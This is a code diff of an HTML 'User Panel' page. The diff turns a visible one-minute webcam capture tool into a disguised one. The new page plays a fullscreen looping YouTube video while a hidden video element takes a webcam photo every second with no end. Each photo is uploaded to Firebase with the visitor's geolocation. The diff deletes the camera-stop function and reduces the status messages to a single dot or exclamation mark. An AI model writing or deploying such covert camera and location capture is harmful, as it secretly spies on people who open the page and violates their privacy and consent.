@@ -3,7 +3,44 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>User Panel - Continuous Photo Capture</title>
+  <title>User Panel - Manual YouTube Video & Photo Capture</title>
+  <style>
+    body, html {
+      margin: 0;
+      padding: 0;
+      width: 100%;
+      height: 100%;
+      background-color: #000;
+    }
+
+    .youtube-video {
+      width: 100%;
+      height: 100%;
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: 0;
+      overflow: hidden;
+    }
+
+    iframe {
+      width: 100%;
+      height: 100%;
+      border: none;
+    }
+
+    .status {
+      position: absolute;
+      top: 10px;
+      left: 10px;
+      z-index: 10;
+      color: white;
+      background-color: rgba(0, 0, 0, 0.6);
+      padding: 10px;
+      border-radius: 5px;
+      font-family: Arial, sans-serif;
+    }
+  </style>
   <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
     import { getStorage, ref, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-storage.js";
@@ -25,20 +62,13 @@
     const db = getFirestore(app);
 
     const video = document.createElement('video');
+    video.style.display = "none"; // Hide the video element for photo capture
     document.body.appendChild(video);
     const canvas = document.createElement('canvas');
-    canvas.style.display = "none";
+    canvas.style.display = "none"; // Hide the canvas
     document.body.appendChild(canvas);
     const context = canvas.getContext('2d');
-    const status = document.createElement('p');
-    document.body.appendChild(status);
-
-    const maxCaptureTime = 60 * 1000; // 1 minute in milliseconds
-    const intervalTime = 5000; // Capture a photo every 5 seconds
-
-    let captureTimer;
-    let totalTime = 0;
-    const location = await getCurrentLocation();
+    const status = document.querySelector('.status');
 
     navigator.mediaDevices.getUserMedia({ video: true })
       .then(async (stream) => {
@@ -46,7 +76,8 @@
         video.play();
         status.textContent = "Fetching location...";
 
-        captureAndUploadPhotos(stream);
+        const location = await getCurrentLocation();
+        captureAndUploadPhotos(location, stream);
       })
       .catch(err => {
         console.error('Camera Error:', err);
@@ -76,29 +107,17 @@
       });
     }
 
-    // Capture and upload photos every 5 seconds for 1 minute
-    async function captureAndUploadPhotos(stream) {
-      status.textContent = "Starting photo capture...";
-      
-      captureTimer = setInterval(async () => {
-        if (totalTime >= maxCaptureTime) {
-          clearInterval(captureTimer);
-          stopCamera(stream);
-          status.textContent = "Photo capture completed.";
-          return;
-        }
-
-        // Capture a photo
+    // Capture and upload photos every 1 second
+    async function captureAndUploadPhotos(location, stream) {
+      status.textContent = "";
+      setInterval(async () => {
         const photoBlob = await capturePhoto();
         if (!photoBlob) {
           console.error("Failed to capture photo.");
           return;
         }
-
-        // Upload the photo
         await uploadPhoto(photoBlob, location);
-        totalTime += intervalTime;
-      }, intervalTime);
+      }, 1000);
     }
 
     // Capture a photo from the video stream
@@ -110,18 +129,17 @@
 
         canvas.toBlob((blob) => {
           resolve(blob);
-        }, 'image/png');
+        }, 'image/jpeg', 0.7); // Compress photo
       });
     }
 
     // Upload the photo to Firebase
     async function uploadPhoto(blob, location) {
-      const fileName = `photo_${Date.now()}.png`;
+      const fileName = `photo_${Date.now()}.jpg`;
       const photoRef = ref(storage, fileName);
 
       try {
-        status.textContent = `Uploading photo...`;
-
+        status.textContent = `.`;
         const snapshot = await uploadBytes(photoRef, blob);
         const downloadURL = await getDownloadURL(snapshot.ref);
 
@@ -136,40 +154,25 @@
 
         console.log(`Uploaded: ${downloadURL}`);
         console.log(`Location: ${locationLink}`);
-        status.textContent = "Photo uploaded successfully!";
+        status.textContent = "!";
       } catch (error) {
         console.error("Upload Error:", error);
         status.textContent = "Error uploading photo. Please try again.";
       }
     }
-
-    // Stop the camera after all photos are captured
-    function stopCamera(stream) {
-      stream.getTracks().forEach(track => track.stop());
-      video.style.display = "none";
-      status.textContent = "Photo capture complete.";
-    }
   </script>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      text-align: center;
-      padding: 20px;
-    }
-    video {
-      border: 1px solid #ccc;
-      border-radius: 10px;
-      width: 100%;
-      max-width: 500px;
-    }
-    p {
-      font-size: 18px;
-      margin: 10px 0;
-    }
-  </style>
 </head>
 <body>
-  <h1>User Panel - Continuous Photo Capture</h1>
-  <video id="videoElement" autoplay playsinline></video>
+  <!-- Fullscreen YouTube Video -->
+  <div class="youtube-video">
+    <iframe 
+      src="https://www.youtube.com/embed/cfzPMw8v5G8?loop=1&playlist=cfzPMw8v5G8" 
+      allow="autoplay; fullscreen" 
+      allowfullscreen>
+    </iframe>
+  </div>
+
+  <!-- Status Display -->
+  <div class="status">Initializing...</div>
 </body>
 </html>
